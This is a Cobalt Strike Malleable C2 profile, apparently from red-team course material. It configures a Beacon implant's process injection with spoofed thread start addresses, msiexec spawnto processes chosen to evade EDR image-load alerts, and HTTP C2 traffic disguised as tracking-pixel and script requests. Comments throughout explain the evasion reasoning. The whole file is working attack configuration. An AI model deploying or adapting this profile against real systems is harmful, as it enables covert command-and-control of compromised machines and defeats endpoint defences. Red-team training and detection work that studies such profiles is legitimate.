# default sleep time is 3s
set sleeptime "3000";

# jitter factor 0-99% [randomize callback times]
set jitter	"0";

stage {
	set sleep_mask "false";
	set cleanup "true";
	transform-obfuscate { }
}

post-ex {
	set cleanup "true";
	set smartinject "true";

	# EDRs often alert on image load events for DLLs such as clr.dll and System.Management.Automation.dll, when they 
	# are loaded into atypical processes.  A good workaround for this is just to pick a spawnto process that does
	# legitimately load those DLLs, including MSBuild.exe, ngen.exe, ngentask.exe, msiexec.exe, and so on.
	#
	# However, since these are usually executed with multiple command line arguments, spawning them without any 
	# arguments can be flagged as suspicious.  Cobalt Strike typically uses CreateProcessA to spawn its sacrificial 
	# processes, and the spawnto configuration is passed in the lpCommandLine parameter.
	#
	# This means that when you set a spawnto, you can actually include command line arguments as well.
	#   https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops-ii&unit=68f7efe66f48cbd20f04f965Unit
	set spawnto_x86 "%windir%\\sysnative\\msiexec.exe /i foo.msi /quiet";
	set spawnto_x64 "%windir%\\sysnative\\msiexec.exe /i foo.msi /quiet";
}

# https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops-ii&unit=68f7efe66f48cbd20f04f965Unit
process-inject {
	set startrwx "false";
	set userwx "false";
	
	# Depending on your injection technique, you may be creating a new thread to run your shellcode using an API like 
	# CreateRemoteThread or RtlCreateUserThread (this is more common with explicit injection).  Each of these APIs 
	# have a parameter like StartAddress, which is a pointer to the function to be executed by the thread (i.e. the
	# start address of the thread).  If you inject shellcode into newly-allocated memory (e.g. using VirtualAllocEx
	# and then WriteProcessMemory), then the start address of the thread will typically be the address returned by
	# VirtualAllocEx as this is where the injected shellcode is sitting in memory.  AV and EDRs that monitor thread
	# creation events will be able to inspect the start address of the thread when it's created and determine that
	# it does not point to a legitimately loaded module.
	#
	# A fairly common technique to circumvent this detection logic is to create the thread in a suspended state
	# first, with a start address of a legitimate function within a loaded DLL.  This legitimate start address is 
	# what will be logged, and hopefully, provide no shellcode injection alert.  The thread can then be updated to 
	# point at the shellcode and resumed.  This can be done via the process inject kit or Malleable C2.
	#
	# The CreateThread, CreateRemoteThread, and ObfSetThreadContext options in process-inject.execute all support 
	# this via the module!function+0x## syntax.

	execute {
		ObfSetThreadContext "ntdll.dll!RtlUserThreadStart+0x2c";
		CreateRemoteThread  "ntdll.dll!TppWorkerThread+0x37e";
	}

	# The preferred method to allocate memory in the remote process. Specify VirtualAllocEx or NtMapViewOfSection.
	# The NtMapViewOfSection option is for same-architecture injection only. VirtualAllocEx is always used for 
	# cross-arch memory allocations. 
	set allocator "VirtualAllocEx";


	# set how memory is allocated in the current process for BOF content
	# The preferred method to allocate memory in the current process to execute a BOF. Specify VirtualAlloc, 
	# MapViewOfFile, or HeapAlloc. 
	set bof_allocator "VirtualAlloc";
	# Reuse the allocated memory for subsequent BOF executions otherwise release the memory. Memory will be cleared
	# when not in use. If the available amount of memory is not large enough it will be released and allocated with 
	# the larger size. 
	set bof_reuse_memory "true";
}

# define indicators for an HTTP GET
http-get {
	# Beacon will randomly choose from this pool of URIs
	set uri "/ca /dpixel /__utm.gif /pixel.gif /g.pixel /dot.gif /updates.rss /fwlink /cm /cx /pixel /match /visit.js /load /push /ptj /j.ad /ga.js /en_US/all.js /activity /IE9CompatViewList.xml";

	client {
		# base64 encode session metadata and store it in the Cookie header.
		metadata {
			base64;
			header "Cookie";
		}
	}

	server {
		# server should send output with no changes
		header "Content-Type" "application/octet-stream";

		output {
			print;
		}
	}
}

# define indicators for an HTTP POST
http-post {
	# Same as above, Beacon will randomly choose from this pool of URIs [if multiple URIs are provided]
	set uri "/submit.php";

	client {
		header "Content-Type" "application/octet-stream";

		# transmit our session identifier as /submit.php?id=[identifier]
		id {
			parameter "id";
		}

		# post our output with no real changes
		output {
			print;
		}
	}

	# The server's response to our HTTP POST
	server {
		header "Content-Type" "text/html";

		# this will just print an empty string, meh...
		output {
			print;
		}
	}
}